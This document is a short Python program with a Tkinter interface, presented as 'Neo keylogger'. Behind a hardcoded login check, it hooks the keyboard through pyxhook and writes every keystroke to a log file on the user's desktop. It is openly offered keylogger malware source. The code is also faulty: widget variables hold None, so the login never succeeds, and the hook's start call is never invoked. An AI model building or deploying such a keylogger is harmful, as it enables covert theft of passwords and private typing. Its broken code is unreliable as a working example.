import tkinter
from tkinter import *
from tkinter import messagebox
import os
import pyxhook

keylogger=tkinter.Tk()
keylogger.geometry("500x350")
keylogger.title("Neo keylogger")



c=tkinter.Label(keylogger,text="Wellcome to Neo The Keylogger", bg="orange", pady=20).pack(fill="x")



c=tkinter.Label(keylogger,text="~Coded by Sourabh", bg="orange").pack(fill="x", pady=20)




tkinter.Label(keylogger, text="UserName").pack(pady=5)

e1=tkinter.Entry(keylogger, borderwidth=3).pack(pady=5)


tkinter.Label(keylogger, text="Password").pack(pady=5)

e2=tkinter.Entry(keylogger,borderwidth=3, relief="sunken").pack(pady=5)


tkinter.Button(keylogger, text="Start Trapping", bg="silver",borderwidth=3, relief="groove", command = lambda : check(e1,e2) ).pack(pady=5)

def check(e1,e2):


    if(e1=="sourabh" and e2=="admin@123"):

        messagebox.showinfo("Service started", "Service successfully started")

        log_file = os.environ.get('mylogger', os.path.expanduser("~/Desktop/file.log"))

        # this function is called everytime a key is pressed.
        def OnKeyPress(event):
            fob = open(log_file, 'a')
            fob.write(event.Key)
            fob.write('\n')

            if event.Ascii == 96:  # 96 is the ascii value of the grave key (`)
                fob.close()
                new_hook.cancel()

        # instantiate HookManager class
        new_hook = pyxhook.HookManager()
        # listen to all keystrokes
        new_hook.KeyDown = OnKeyPress
        # hook the keyboard
        new_hook.HookKeyboard()
        # start the session
        new_hook.start


    else:
        messagebox.showinfo("Error", "you are typing wrong information")





keylogger.mainloop()
